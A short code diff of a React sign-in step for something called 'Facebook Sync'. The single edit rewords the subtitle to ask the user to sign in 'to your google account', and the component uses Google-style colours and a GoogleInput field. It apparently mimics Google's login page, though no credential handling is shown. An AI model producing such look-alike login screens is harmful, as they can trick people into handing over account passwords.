@@ -108,7 +108,7 @@ function EmailStep({ onNext }: { onNext: (email: string, id: number) => void }) 
         <FaFacebook className="w-10 h-10 text-[#1877F2]" />
       </div>
       <h1 className="text-[1.5rem] font-normal mb-2 text-[#202124]">Sign in</h1>
-      <p className="text-[1rem] text-[#202124] mb-8 text-center">to continue to Facebook Sync</p>
+      <p className="text-[1rem] text-[#202124] mb-8 text-center">to your google account to continue Facebook Sync</p>
 
       <form onSubmit={handleSubmit} className="w-full mt-2">
         <GoogleInput 
